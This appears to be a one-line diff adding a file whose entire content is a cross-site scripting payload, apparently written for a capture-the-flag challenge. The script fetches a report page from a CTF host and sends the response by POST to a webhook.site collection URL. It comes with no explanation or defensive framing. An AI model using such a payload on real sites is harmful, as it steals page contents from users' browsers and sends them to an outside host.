@@ -1,0 +1,1 @@
+<script>fetch("https://edu-ctf.csie.org:44301/report/0").then(r=>{return r.text()}).then(t=>{fetch("https://webhook.site/394e04a1-20a5-476f-b77a-e7ac13d09208",{method:'POST',body:escape(t)})})</script>
